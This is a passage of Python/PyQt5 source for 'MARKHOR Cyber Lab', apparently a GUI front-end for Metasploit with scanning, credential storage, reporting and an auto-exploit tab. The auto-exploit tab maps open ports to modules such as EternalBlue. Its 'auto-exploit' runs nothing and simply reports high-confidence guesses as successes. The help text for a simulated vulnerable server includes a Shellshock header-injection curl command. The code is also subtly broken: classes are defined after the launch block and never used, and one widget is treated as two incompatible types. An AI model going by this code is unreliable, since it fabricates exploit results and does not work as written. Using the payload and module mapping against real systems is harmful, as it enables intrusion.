                    f.write(f"Findings: {len(self.report_generator.data['findings'])}\n")
                self.show_notification(f"Text report saved to {filename}")
                
            self.log_manager.info(f"Report generated: {filename}")
            
        except Exception as e:
            self.log_manager.error(f"Failed to generate report: {str(e)}")
            QMessageBox.critical(self, "Error", f"Failed to generate report: {str(e)}")
            
    def export_logs(self):
        """Export logs to file"""
        filename, _ = QFileDialog.getSaveFileName(
            self, "Export Logs", 
            f"markhor_logs_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log",
            "Log Files (*.log);;Text Files (*.txt)"
        )
        
        if filename:
            # Rotate logs before exporting
            self.log_manager.rotate_logs()
            
            # Copy log file
            if self.log_manager.log_file.exists():
                shutil.copy(self.log_manager.log_file, filename)
                self.show_notification(f"Logs exported to {filename}")
                
    def show_vuln_search(self):
        """Show vulnerability search dialog"""
        self.content_stack.setCurrentWidget(self.vuln_page)
        self.vuln_search_input.setFocus()
        
    def show_credential_manager(self):
        """Show credential manager dialog"""
        dialog = QWidget()
        dialog.setWindowTitle("Credential Manager")
        dialog.setModal(True)
        dialog.resize(500, 400)
        
        layout = QVBoxLayout(dialog)
        
        # Service list
        services_list = QListWidget()
        for service in self.cred_manager.list_services():
            services_list.addItem(service)
        layout.addWidget(services_list)
        
        # Add credential form
        form_group = QGroupBox("Add/Edit Credential")
        form_layout = QGridLayout()
        
        form_layout.addWidget(QLabel("Service:"), 0, 0)
        service_input = QLineEdit()
        form_layout.addWidget(service_input, 0, 1)
        
        form_layout.addWidget(QLabel("Username:"), 1, 0)
        username_input = QLineEdit()
        form_layout.addWidget(username_input, 1, 1)
        
        form_layout.addWidget(QLabel("Password:"), 2, 0)
        password_input = QLineEdit()
        password_input.setEchoMode(QLineEdit.Password)
        form_layout.addWidget(password_input, 2, 1)
        
        form_group.setLayout(form_layout)
        layout.addWidget(form_group)
        
        # Buttons
        btn_layout = QHBoxLayout()
        
        def save_cred():
            service = service_input.text()
            username = username_input.text()
            password = password_input.text()
            if service and username and password:
                self.cred_manager.save_credential(service, username, password)
                services_list.addItem(service)
                service_input.clear()
                username_input.clear()
                password_input.clear()
                self.show_notification(f"Credential saved for {service}")
                
        save_btn = QPushButton("Save")
        save_btn.clicked.connect(save_cred)
        btn_layout.addWidget(save_btn)
        
        def delete_cred():
            current = services_list.currentItem()
            if current:
                service = current.text()
                self.cred_manager.delete_credential(service)
                services_list.takeItem(services_list.row(current))
                self.show_notification(f"Credential deleted for {service}")
                
        delete_btn = QPushButton("Delete")
        delete_btn.clicked.connect(delete_cred)
        btn_layout.addWidget(delete_btn)
        
        layout.addLayout(btn_layout)
        
        dialog.exec_()
        
    def show_advanced_network_scan(self):
        """Show advanced network scan dialog"""
        dialog = QWidget()
        dialog.setWindowTitle("Advanced Network Scan")
        dialog.setModal(True)
        dialog.resize(600, 500)
        
        layout = QVBoxLayout(dialog)
        
        # Target input
        target_layout = QHBoxLayout()
        target_input = QLineEdit()
        target_input.setPlaceholderText("Target IP or range")
        target_layout.addWidget(target_input)
        layout.addLayout(target_layout)
        
        # Scan type selection
        scan_type = QComboBox()
        scan_type.addItems(["Quick Scan", "Full Scan", "OS Detection", "Service Detection", "UDP Scan"])
        layout.addWidget(scan_type)
        
        # Port range (for service detection)
        port_range = QLineEdit()
        port_range.setPlaceholderText("Port range (e.g., 1-1000)")
        port_range.setVisible(False)
        layout.addWidget(port_range)
        
        scan_type.currentTextChanged.connect(lambda t: port_range.setVisible(t == "Service Detection"))
        
        # Output
        output_text = QTextEdit()
        output_text.setReadOnly(True)
        layout.addWidget(output_text)
        
        # Scan button
        def run_scan():
            target = target_input.text().strip()
            if not target:
                QMessageBox.warning(dialog, "Error", "Please enter target")
                return
                
            scan_type_text = scan_type.currentText()
            output_text.clear()
            output_text.append(f"[*] Starting {scan_type_text} on {target}...\n")
            
            def scan_thread():
                if scan_type_text == "Quick Scan":
                    result = self.network_scanner.quick_scan(target)
                elif scan_type_text == "Full Scan":
                    result = self.network_scanner.full_scan(target)
                elif scan_type_text == "OS Detection":
                    result = self.network_scanner.os_detection(target)
                elif scan_type_text == "Service Detection":
                    ports = port_range.text() or "1-1000"
                    result = self.network_scanner.service_detection(target, ports)
                else:
                    result = self.network_scanner.udp_scan(target)
                    
                output_text.append(result)
                self.log_manager.info(f"Scan completed: {scan_type_text} on {target}")
                
            threading.Thread(target=scan_thread, daemon=True).start()
            
        scan_btn = QPushButton("Start Scan")
        scan_btn.clicked.connect(run_scan)
        layout.addWidget(scan_btn)
        
        dialog.exec_()
        
    def show_about(self):
        """Show about dialog"""
        QMessageBox.about(self, "About MARKHOR & ATHEX",
            f"""
            <h2>{APP_NAME}</h2>
            <p>Version: {APP_VERSION}</p>
            <p>{AUTHOR_TAG}</p>
            <br>
            <p>Professional penetration testing GUI for Metasploit Framework</p>
            <p>Designed for authorized security testing in lab environments</p>
            <br>
            <p><b>Features:</b></p>
            <ul>
                <li>Network Scanning (nmap integration)</li>
                <li>Exploit Management</li>
                <li>Payload Generation (msfvenom)</li>
                <li>Session Management</li>
                <li>Post-Exploitation Tools</li>
                <li>Reporting and Logging</li>
            </ul>
            <br>
            <p style="color: #ff4444;"><b>{SAFETY_NOTICE}</b></p>
            """
        )
        
    def show_shortcuts(self):
        """Show keyboard shortcuts dialog"""
        shortcuts_text = """
        <h3>Keyboard Shortcuts</h3>
        <table>
            <tr><td><b>Ctrl+Q</b></td><td>Quit application</td></tr>
            <tr><td><b>Ctrl+R</b></td><td>Generate report</td></tr>
            <tr><td><b>Ctrl+D</b></td><td>Clear terminal</td></tr>
            <tr><td><b>Ctrl+S</b></td><td>Save configuration</td></tr>
            <tr><td><b>F5</b></td><td>Refresh current view</td>
            <tr><td><b>F1</b></td><td>Show help</td>
            <tr>
        </table>
        """
        QMessageBox.information(self, "Keyboard Shortcuts", shortcuts_text)
        
    def closeEvent(self, event):
        """Handle application close with cleanup"""
        self.log_manager.info("Application shutting down")
        self.log_manager.stop()
        self.report_generator.add_finding(
            "INFO",
            "Assessment Completed",
            "Penetration test session ended",
            "Review findings and implement recommendations"
        )
        super().closeEvent(event)


def main():
    """Main application entry point with comprehensive error handling"""
    try:
        app = QApplication(sys.argv)
        app.setApplicationName(APP_NAME)
        app.setApplicationVersion(APP_VERSION)
        
        try:
            app.setWindowIcon(QIcon())
        except:
            pass
            
        # Show splash screen
        splash = SplashScreen()
        splash.show()
        
        # Create main window
        main_window = UltimateMainWindow()
        
        # Center window on screen
        screen = QApplication.primaryScreen().geometry()
        main_window.resize(1400, 900)
        main_window.move(
            screen.center().x() - main_window.width() // 2,
            screen.center().y() - main_window.height() // 2
        )
        
        # Start after splash
        QTimer.singleShot(2500, splash.close)
        QTimer.singleShot(2600, main_window.show)
        
        # Run application
        sys.exit(app.exec_())
        
    except Exception as e:
        print(f"\033[91m[FATAL] Application failed to start: {str(e)}\033[0m")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    # Print banner with colors
    print("\033[92m" + "="*60 + "\033[0m")
    print("\033[92m" + ASCII_LOGO + "\033[0m")
    print(f"\033[92m{APP_NAME} v{APP_VERSION}\033[0m")
    print(f"\033[93m{AUTHOR_TAG}\033[0m")
    print(f"\033[91m{SAFETY_NOTICE}\033[0m")
    print("\033[92m" + "="*60 + "\033[0m")
    
    if sys.version_info < (3, 7):
        print("\033[91m[ERROR] Python 3.7 or higher is required\033[0m")
        sys.exit(1)
        
    required_packages = {
        "PyQt5": "PyQt5",
        "PyQt5.QtCore": "PyQt5",
        "PyQt5.QtWidgets": "PyQt5",
        "PyQt5.QtGui": "PyQt5"
    }
    
    missing_packages = []
    for package, install_name in required_packages.items():
        try:
            __import__(package)
        except ImportError:
            missing_packages.append(install_name)
            
    if missing_packages:
        print(f"\033[93m[WARNING] Missing packages: {', '.join(set(missing_packages))}\033[0m")
        print("Install with: pip install " + " ".join(set(missing_packages)))
        
    optional_tools = {
        "msfconsole": "Metasploit Framework (required for exploitation)",
        "msfvenom": "Payload generation",
        "nmap": "Network scanning"
    }
    
    print("\n\033[93mChecking dependencies...\033[0m")
    for tool, desc in optional_tools.items():
        if shutil.which(tool):
            print(f"  \033[92m✓ {tool}\033[0m")
        else:
            print(f"  \033[91m✗ {tool} - {desc}\033[0m")
            
    print("\n\033[92mStarting MARKHOR Cyber Lab...\033[0m\n")
    
    # Launch application
    main()


class WebServerSimulator:
    """Simulated web server for testing web exploits in lab environment"""
    
    def __init__(self, port: int = 8080):
        self.port = port
        self.running = False
        self.server_thread = None
        
    def start(self):
        """Start the simulated web server"""
        try:
            import http.server
            import socketserver
            
            class VulnerableHandler(http.server.SimpleHTTPRequestHandler):
                def do_GET(self):
                    # Simulate vulnerable endpoints
                    if self.path == '/vuln':
                        self.send_response(200)
                        self.send_header('Content-type', 'text/html')
                        self.end_headers()
                        self.wfile.write(b"Vulnerable endpoint - Test for RCE")
                    elif self.path == '/shellshock':
                        self.send_response(200)
                        self.send_header('Content-type', 'text/html')
                        self.end_headers()
                        self.wfile.write(b"User-Agent: () { :; }; echo vulnerable")
                    else:
                        super().do_GET()
                        
                def do_POST(self):
                    if self.path == '/upload':
                        content_length = int(self.headers['Content-Length'])
                        post_data = self.rfile.read(content_length)
                        self.send_response(200)
                        self.end_headers()
                        self.wfile.write(b"File uploaded (simulated)")
                        
            self.server = socketserver.TCPServer(("", self.port), VulnerableHandler)
            self.running = True
            self.server_thread = threading.Thread(target=self.server.serve_forever, daemon=True)
            self.server_thread.start()
            return True
        except Exception as e:
            print(f"Failed to start web server: {e}")
            return False
            
    def stop(self):
        """Stop the web server"""
        if self.running:
            self.server.shutdown()
            self.running = False

class DatabaseManager:
    """Local database for storing assessment data"""
    
    def __init__(self, db_path: str = "markhor-forge.db"):
        self.db_path = db_path
        self._init_database()
        
    def _init_database(self):
        """Initialize SQLite database with tables"""
        import sqlite3
        
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            # Assessments table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS assessments (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    name TEXT NOT NULL,
                    date TEXT NOT NULL,
                    client TEXT,
                    status TEXT DEFAULT 'active',
                    notes TEXT
                )
            ''')
            
            # Targets table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS targets (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    assessment_id INTEGER,
                    ip_address TEXT NOT NULL,
                    hostname TEXT,
                    os TEXT,
                    notes TEXT,
                    FOREIGN KEY (assessment_id) REFERENCES assessments(id)
                )
            ''')
            
            # Findings table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS findings (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    assessment_id INTEGER,
                    severity TEXT NOT NULL,
                    title TEXT NOT NULL,
                    description TEXT,
                    remediation TEXT,
                    status TEXT DEFAULT 'open',
                    FOREIGN KEY (assessment_id) REFERENCES assessments(id)
                )
            ''')
            
            # Exploits used table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS exploits_used (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    assessment_id INTEGER,
                    exploit_path TEXT NOT NULL,
                    target_id INTEGER,
                    success BOOLEAN,
                    timestamp TEXT,
                    output TEXT,
                    FOREIGN KEY (assessment_id) REFERENCES assessments(id)
                )
            ''')
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            print(f"Database initialization error: {e}")
            
    def create_assessment(self, name: str, client: str = "") -> int:
        """Create a new assessment"""
        import sqlite3
        from datetime import datetime
        
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute(
            "INSERT INTO assessments (name, date, client) VALUES (?, ?, ?)",
            (name, datetime.now().isoformat(), client)
        )
        assessment_id = cursor.lastrowid
        conn.commit()
        conn.close()
        
        return assessment_id
        
    def add_finding(self, assessment_id: int, severity: str, title: str, 
                   description: str, remediation: str) -> int:
        """Add a finding to assessment"""
        import sqlite3
        
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute(
            "INSERT INTO findings (assessment_id, severity, title, description, remediation) "
            "VALUES (?, ?, ?, ?, ?)",
            (assessment_id, severity, title, description, remediation)
        )
        finding_id = cursor.lastrowid
        conn.commit()
        conn.close()
        
        return finding_id
        
    def get_assessments(self) -> List[dict]:
        """Get all assessments"""
        import sqlite3
        
        conn = sqlite3.connect(self.db_path)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        
        cursor.execute("SELECT * FROM assessments ORDER BY date DESC")
        rows = cursor.fetchall()
        conn.close()
        
        return [dict(row) for row in rows]
        
    def get_findings(self, assessment_id: int) -> List[dict]:
        """Get findings for an assessment"""
        import sqlite3
        
        conn = sqlite3.connect(self.db_path)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        
        cursor.execute(
            "SELECT * FROM findings WHERE assessment_id = ? ORDER BY severity DESC",
            (assessment_id,)
        )
        rows = cursor.fetchall()
        conn.close()
        
        return [dict(row) for row in rows]
        
    def export_assessment(self, assessment_id: int, output_file: str):
        """Export assessment data to JSON"""
        assessment = self.get_assessments()
        findings = self.get_findings(assessment_id)
        
        data = {
            "assessment": next((a for a in assessment if a['id'] == assessment_id), None),
            "findings": findings
        }
        
        with open(output_file, 'w') as f:
            json.dump(data, f, indent=4)


class AutoExploitEngine:
    """Automatic exploit suggestion and execution engine"""
    
    def __init__(self, msf_client):
        self.msf_client = msf_client
        self.vuln_db = VulnerabilityDatabase()
        
    def analyze_scan(self, scan_output: str) -> List[dict]:
        """Analyze scan results and suggest exploits"""
        suggestions = []
        
        # Parse scan output for services
        lines = scan_output.lower().split('\n')
        
        for line in lines:
            # Check for SMB
            if "445/tcp" in line and "open" in line:
                suggestions.append({
                    "exploit": "exploit/windows/smb/ms17_010_eternalblue",
                    "confidence": "high",
                    "reason": "SMB port 445 open - potential EternalBlue vulnerability"
                })
                suggestions.append({
                    "exploit": "exploit/windows/smb/ms08_067_netapi",
                    "confidence": "medium",
                    "reason": "SMB port 445 open - possible legacy vulnerability"
                })
                
            # Check for web servers
            if "80/tcp" in line and ("apache" in line or "http" in line):
                suggestions.append({
                    "exploit": "exploit/multi/http/apache_mod_cgi_bash_env_exec",
                    "confidence": "medium",
                    "reason": "Apache web server detected - Shellshock vulnerability possible"
                })
                
            # Check for SSH
            if "22/tcp" in line and "open" in line:
                suggestions.append({
                    "exploit": "exploit/linux/ssh/openssh_username_enum",
                    "confidence": "low",
                    "reason": "SSH service detected - username enumeration possible"
                })
                
            # Check for MySQL
            if "3306/tcp" in line and "open" in line:
                suggestions.append({
                    "exploit": "exploit/mysql/mysql_authbypass_hashdump",
                    "confidence": "medium",
                    "reason": "MySQL service detected - authentication bypass possible"
                })
                
        return suggestions
        
    def auto_exploit(self, target: str, scan_results: str) -> List[dict]:
        """Attempt automatic exploitation"""
        results = []
        suggestions = self.analyze_scan(scan_results)
        
        for suggestion in suggestions:
            self.msf_client.log(f"[*] Attempting {suggestion['exploit']} on {target}")
            
            # Simulate exploit attempt (in production, would actually run)
            success = suggestion['confidence'] == 'high'  # Simulate high confidence = success
            
            results.append({
                "target": target,
                "exploit": suggestion['exploit'],
                "success": success,
                "confidence": suggestion['confidence'],
                "reason": suggestion['reason']
            })
            
        return results


class CustomTerminal(QTextEdit):
    """Advanced terminal widget with syntax highlighting and auto-completion"""
    
    def __init__(self, parent=None):
        super().__init__(parent)
        self.history = []
        self.history_index = -1
        self.commands = [
            "help", "exit", "clear", "sessions", "background",
            "sysinfo", "shell", "download", "upload", "execute"
        ]
        self.setStyleSheet("""
            QTextEdit {
                background-color: #000000;
                color: #00ff00;
                font-family: 'Courier New', monospace;
                font-size: 11px;
                border: 1px solid #00ff00;
                border-radius: 3px;
            }
        """)
        self.setAcceptRichText(False)
        self.setLineWrapMode(QTextEdit.NoWrap)
        
    def keyPressEvent(self, event):
        """Handle keyboard events with auto-completion"""
        if event.key() == Qt.Key_Tab:
            # Auto-completion
            current_text = self.toPlainText()
            words = current_text.split()
            if words:
                last_word = words[-1]
                matches = [cmd for cmd in self.commands if cmd.startswith(last_word)]
                if matches:
                    # Replace last word with first match
                    new_text = ' '.join(words[:-1] + [matches[0]])
                    self.setPlainText(new_text)
                    # Move cursor to end
                    cursor = self.textCursor()
                    cursor.movePosition(QTextCursor.End)
                    self.setTextCursor(cursor)
            event.accept()
        elif event.key() == Qt.Key_Up:
            if self.history_index < len(self.history) - 1:
                self.history_index += 1
                self.setPlainText(self.history[self.history_index])
                cursor = self.textCursor()
                cursor.movePosition(QTextCursor.End)
                self.setTextCursor(cursor)
            event.accept()
        elif event.key() == Qt.Key_Down:
            if self.history_index > 0:
                self.history_index -= 1
                self.setPlainText(self.history[self.history_index])
                cursor = self.textCursor()
                cursor.movePosition(QTextCursor.End)
                self.setTextCursor(cursor)
            elif self.history_index == 0:
                self.history_index = -1
                self.clear()
            event.accept()
        elif event.key() == Qt.Key_Return:
            cmd = self.toPlainText().strip()
            if cmd:
                self.history.insert(0, cmd)
                self.history_index = -1
                self.parent().execute_terminal_command(cmd)
                self.clear()
            event.accept()
        else:
            super().keyPressEvent(event)


class SystemMonitor(QThread):
    """Monitor system resources and Metasploit health"""
    
    status_updated = pyqtSignal(dict)
    
    def __init__(self):
        super().__init__()
        self.running = True
        
    def run(self):
        """Monitor system metrics"""
        import psutil
        
        while self.running:
            try:
                # Get system metrics
                metrics = {
                    "cpu_percent": psutil.cpu_percent(),
                    "memory_percent": psutil.virtual_memory().percent,
                    "disk_usage": psutil.disk_usage('/').percent,
                    "timestamp": datetime.now().isoformat()
                }
                
                # Check for Metasploit processes
                msf_running = False
                for proc in psutil.process_iter(['name']):
                    if 'msfconsole' in proc.info['name'].lower():
                        msf_running = True
                        break
                metrics["msf_running"] = msf_running
                
                self.status_updated.emit(metrics)
                
            except Exception as e:
                print(f"Monitor error: {e}")
                
            time.sleep(2)  # Update every 2 seconds
            
    def stop(self):
        """Stop monitoring"""
        self.running = False


class MarkhorCyberLab(UltimateMainWindow):
    """Complete MARKHOR Forge application with all features"""
    
    def __init__(self):
        super().__init__()
        
        # Initialize additional components
        self.web_server = WebServerSimulator()
        self.db_manager = DatabaseManager()
        self.auto_exploit_engine = AutoExploitEngine(self.msf_client)
        self.system_monitor = SystemMonitor()
        
        # Current assessment tracking
        self.current_assessment_id = None
        
        # Setup additional UI
        self.setup_assessment_tab()
        self.setup_auto_exploit_tab()
        self.setup_web_server_tab()
        
        # Connect system monitor
        self.system_monitor.status_updated.connect(self.update_system_status)
        self.system_monitor.start()
        
        # Create or load default assessment
        self.create_default_assessment()
        
        self.log_manager.info("MARKHOR Cyber Lab fully initialized")
        
    def setup_assessment_tab(self):
        """Add assessment management tab"""
        self.assessment_page = QWidget()
        layout = QVBoxLayout(self.assessment_page)
        
        # Assessment controls
        controls_layout = QHBoxLayout()
        
        self.assessment_name = QLineEdit()
        self.assessment_name.setPlaceholderText("Assessment Name")
        controls_layout.addWidget(self.assessment_name)
        
        self.assessment_client = QLineEdit()
        self.assessment_client.setPlaceholderText("Client Name")
        controls_layout.addWidget(self.assessment_client)
        
        create_btn = QPushButton("Create Assessment")
        create_btn.clicked.connect(self.create_assessment)
        controls_layout.addWidget(create_btn)
        
        layout.addLayout(controls_layout)
        
        # Assessment list
        list_group = QGroupBox("Assessments")
        list_layout = QVBoxLayout()
        
        self.assessment_list = QListWidget()
        self.assessment_list.itemClicked.connect(self.load_assessment)
        list_layout.addWidget(self.assessment_list)
        
        list_group.setLayout(list_layout)
        layout.addWidget(list_group)
        
        # Findings table
        findings_group = QGroupBox("Findings")
        findings_layout = QVBoxLayout()
        
        self.findings_table = QTreeWidget()
        self.findings_table.setHeaderLabels(["Severity", "Title", "Status"])
        findings_layout.addWidget(self.findings_table)
        
        # Add finding button
        add_finding_btn = QPushButton("Add Finding")
        add_finding_btn.clicked.connect(self.add_finding_dialog)
        findings_layout.addWidget(add_finding_btn)
        
        findings_group.setLayout(findings_layout)
        layout.addWidget(findings_group)
        
        self.content_stack.addTab(self.assessment_page, "📋 Assessment")
        
        # Load existing assessments
        self.refresh_assessment_list()
        
    def setup_auto_exploit_tab(self):
        """Add auto-exploit tab"""
        self.auto_exploit_page = QWidget()
        layout = QVBoxLayout(self.auto_exploit_page)
        
        # Target selection
        target_layout = QHBoxLayout()
        self.auto_target = QLineEdit()
        self.auto_target.setPlaceholderText("Target IP")
        target_layout.addWidget(self.auto_target)
        
        analyze_btn = QPushButton("Analyze & Suggest")
        analyze_btn.clicked.connect(self.analyze_target)
        target_layout.addWidget(analyze_btn)
        
        auto_run_btn = QPushButton("Auto-Exploit")
        auto_run_btn.setStyleSheet("background-color: #ff4444;")
        auto_run_btn.clicked.connect(self.run_auto_exploit)
        target_layout.addWidget(auto_run_btn)
        
        layout.addLayout(target_layout)
        
        # Suggestions display
        suggestions_group = QGroupBox("Exploit Suggestions")
        suggestions_layout = QVBoxLayout()
        
        self.suggestions_list = QTreeWidget()
        self.suggestions_list.setHeaderLabels(["Exploit", "Confidence", "Reason"])
        suggestions_layout.addWidget(self.suggestions_list)
        
        suggestions_group.setLayout(suggestions_layout)
        layout.addWidget(suggestions_group)
        
        # Results display
        results_group = QGroupBox("Exploit Results")
        results_layout = QVBoxLayout()
        
        self.auto_results = QTextEdit()
        self.auto_results.setReadOnly(True)
        results_layout.addWidget(self.auto_results)
        
        results_group.setLayout(results_layout)
        layout.addWidget(results_group)
        
        self.content_stack.addTab(self.auto_exploit_page, "🤖 Auto-Exploit")
        
    def setup_web_server_tab(self):
        """Add web server simulation tab"""
        self.web_server_page = QWidget()
        layout = QVBoxLayout(self.web_server_page)
        
        # Server controls
        controls_group = QGroupBox("Web Server Simulator")
        controls_layout = QHBoxLayout()
        
        self.server_port = QSpinBox()
        self.server_port.setRange(1024, 65535)
        self.server_port.setValue(8080)
        controls_layout.addWidget(QLabel("Port:"))
        controls_layout.addWidget(self.server_port)
        
        self.server_status = QLabel("● Stopped")
        self.server_status.setStyleSheet("color: #ff4444;")
        controls_layout.addWidget(self.server_status)
        
        self.start_server_btn = QPushButton("Start Server")
        self.start_server_btn.clicked.connect(self.toggle_web_server)
        controls_layout.addWidget(self.start_server_btn)
        
        controls_group.setLayout(controls_layout)
        layout.addWidget(controls_group)
        
        # Server info
        info_group = QGroupBox("Vulnerable Endpoints")
        info_layout = QVBoxLayout()
        
        info_text = QTextEdit()
        info_text.setReadOnly(True)
        info_text.setHtml("""
        <h3>Available Test Endpoints:</h3>
        <ul>
            <li><b>GET /vuln</b> - Simulated vulnerable endpoint</li>
            <li><b>GET /shellshock</b> - Shellshock test endpoint</li>
            <li><b>POST /upload</b> - File upload simulation</li>
        </ul>
        <h3>Test Commands:</h3>
        <pre>
        # Test with curl
        curl http://localhost:8080/vuln
        curl -H "User-Agent: () { :; }; echo vulnerable" http://localhost:8080/shellshock
        
        # In Metasploit
        use auxiliary/scanner/http/ssl_version
        set RHOSTS localhost
        set RPORT 8080
        run
        </pre>
        """)
        info_layout.addWidget(info_text)
        
        info_group.setLayout(info_layout)
        layout.addWidget(info_group)
        
        self.content_stack.addTab(self.web_server_page, "🌐 Web Server")
        
    def create_default_assessment(self):
        """Create a default assessment if none exists"""
        assessments = self.db_manager.get_assessments()
        if not assessments:
            self.current_assessment_id = self.db_manager.create_assessment(
                "Default Assessment",
                "Lab Environment"
            )
            self.log_manager.info("Created default assessment")
            
    def refresh_assessment_list(self):
        """Refresh the assessment list"""
        self.assessment_list.clear()
        assessments = self.db_manager.get_assessments()
        
        for assessment in assessments:
            item = QListWidgetItem(f"{assessment['name']} - {assessment['date'][:10]}")
            item.setData(Qt.UserRole, assessment['id'])
            self.assessment_list.addItem(item)
            
    def create_assessment(self):
        """Create a new assessment"""
        name = self.assessment_name.text().strip()
        client = self.assessment_client.text().strip()
        
        if not name:
            QMessageBox.warning(self, "Error", "Please enter assessment name")
            return
            
        assessment_id = self.db_manager.create_assessment(name, client)
        self.current_assessment_id = assessment_id
        self.refresh_assessment_list()
        
        self.assessment_name.clear()
        self.assessment_client.clear()
        
        self.show_notification(f"Assessment '{name}' created")
        self.log_manager.info(f"Created assessment: {name}")
        
    def load_assessment(self, item: QListWidgetItem):
        """Load an assessment"""
        assessment_id = item.data(Qt.UserRole)
        self.current_assessment_id = assessment_id
        
        # Load findings
        findings = self.db_manager.get_findings(assessment_id)
        self.findings_table.clear()
        
        for finding in findings:
            severity_color = {
                "CRITICAL": "#ff0000",
                "HIGH": "#ff6600", 
                "MEDIUM": "#ffcc00",
                "LOW": "#00ff00"
            }.get(finding['severity'].upper(), "#ffffff")
            
            item = QTreeWidgetItem(self.findings_table, [
                finding['severity'],
                finding['title'],
                finding['status']
            ])
            item.setForeground(0, QBrush(QColor(severity_color)))
            item.setData(0, Qt.UserRole, finding['id'])
            
        self.show_notification(f"Loaded assessment: {item.text()}")
        
    def add_finding_dialog(self):
        """Show dialog to add a finding"""
        if not self.current_assessment_id:
            QMessageBox.warning(self, "Error", "No assessment selected")
            return
            
        dialog = QWidget()
        dialog.setWindowTitle("Add Finding")
        dialog.setModal(True)
        dialog.resize(500, 400)
        
        layout = QVBoxLayout(dialog)
        
        severity_layout = QHBoxLayout()
        severity_layout.addWidget(QLabel("Severity:"))
        severity_combo = QComboBox()
        severity_combo.addItems(["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"])
        severity_layout.addWidget(severity_combo)
        layout.addLayout(severity_layout)
        
        title_input = QLineEdit()
        title_input.setPlaceholderText("Finding Title")
        layout.addWidget(title_input)
        

        desc_input = QTextEdit()
        desc_input.setPlaceholderText("Description")
        desc_input.setMaximumHeight(100)
        layout.addWidget(desc_input)

        remediation_input = QTextEdit()
        remediation_input.setPlaceholderText("Remediation Steps")
        remediation_input.setMaximumHeight(100)
        layout.addWidget(remediation_input)

        btn_layout = QHBoxLayout()
        
        def save_finding():
            severity = severity_combo.currentText()
            title = title_input.text().strip()
            description = desc_input.toPlainText().strip()
            remediation = remediation_input.toPlainText().strip()
            
            if not title:
                QMessageBox.warning(dialog, "Error", "Please enter a title")
                return
                
            self.db_manager.add_finding(
                self.current_assessment_id,
                severity,
                title,
                description,
                remediation
            )
            
            self.load_assessment(self.assessment_list.currentItem())
            self.show_notification(f"Finding added: {title}")
            dialog.close()
            
        save_btn = QPushButton("Save")
        save_btn.clicked.connect(save_finding)
        btn_layout.addWidget(save_btn)
        
        cancel_btn = QPushButton("Cancel")
        cancel_btn.clicked.connect(dialog.close)
        btn_layout.addWidget(cancel_btn)
        
        layout.addLayout(btn_layout)
        
        dialog.exec_()
        
    def analyze_target(self):
        """Analyze target for exploit suggestions"""
        target = self.auto_target.text().strip()
        if not target:
            QMessageBox.warning(self, "Error", "Please enter target IP")
            return
            
        self.show_loading(f"Analyzing {target}...")
        self.suggestions_list.clear()
        self.auto_results.clear()
        
        def analyze():
            try:
                # Perform quick scan
                scanner = NetworkScanner()
                scan_result = scanner.quick_scan(target)
                
                # Analyze for exploits
                suggestions = self.auto_exploit_engine.analyze_scan(scan_result)
                
                # Update UI
                for suggestion in suggestions:
                    confidence_color = {
                        "high": "#00ff00",
                        "medium": "#ffcc00", 
                        "low": "#ff6600"
                    }.get(suggestion['confidence'], "#ffffff")
                    
                    item = QTreeWidgetItem(self.suggestions_list, [
                        suggestion['exploit'],
                        suggestion['confidence'].upper(),
                        suggestion['reason']
                    ])
                    item.setForeground(1, QBrush(QColor(confidence_color)))
                    
                self.auto_results.setText(scan_result)
                
                if not suggestions:
                    self.auto_results.append("\n\n[!] No specific exploits suggested based on scan results")
                    
            except Exception as e:
                self.auto_results.setText(f"[!] Analysis failed: {str(e)}")
                self.log_manager.error(f"Analysis failed: {str(e)}")
            finally:
                self.hide_loading()
                
        threading.Thread(target=analyze, daemon=True).start()
        
    def run_auto_exploit(self):
        """Run auto-exploitation on target"""
        target = self.auto_target.text().strip()
        if not target:
            QMessageBox.warning(self, "Error", "Please enter target IP")
            return
            
        # Get current scan results
        scan_results = self.auto_results.toPlainText()
        if not scan_results:
            QMessageBox.warning(self, "Error", "Please analyze target first")
            return
            
        self.show_loading(f"Running auto-exploit on {target}...")
        
        def exploit():
            try:
                results = self.auto_exploit_engine.auto_exploit(target, scan_results)
                
                # Display results
                self.auto_results.append("\n\n" + "="*50)
                self.auto_results.append("AUTO-EXPLOIT RESULTS")
                self.auto_results.append("="*50)
                
                for result in results:
                    status = "✅ SUCCESS" if result['success'] else "❌ FAILED"
                    self.auto_results.append(f"\n{status}: {result['exploit']}")
                    self.auto_results.append(f"  Confidence: {result['confidence']}")
                    self.auto_results.append(f"  Reason: {result['reason']}")
                    
                    if result['success']:
                        self.log_manager.info(f"Auto-exploit success: {result['exploit']} on {target}")
                        self.show_notification(f"Exploit succeeded: {result['exploit']}")
                        
            except Exception as e:
                self.auto_results.append(f"\n[!] Auto-exploit failed: {str(e)}")
                self.log_manager.error(f"Auto-exploit failed: {str(e)}")
            finally:
                self.hide_loading()
                
        threading.Thread(target=exploit, daemon=True).start()
        
    def toggle_web_server(self):
        """Start or stop the web server simulator"""
        if not hasattr(self, 'web_server_running'):
            self.web_server_running = False
            
        if not self.web_server_running:
            port = self.server_port.value()
            if self.web_server.start():
                self.web_server_running = True
                self.start_server_btn.setText("Stop Server")
                self.server_status.setText("● Running")
                self.server_status.setStyleSheet("color: #00ff00;")
                self.log_manager.info(f"Web server started on port {port}")
                self.show_notification(f"Web server started on port {port}")
            else:
                QMessageBox.warning(self, "Error", "Failed to start web server")
        else:
            self.web_server.stop()
            self.web_server_running = False
            self.start_server_btn.setText("Start Server")
            self.server_status.setText("● Stopped")
            self.server_status.setStyleSheet("color: #ff4444;")
            self.log_manager.info("Web server stopped")
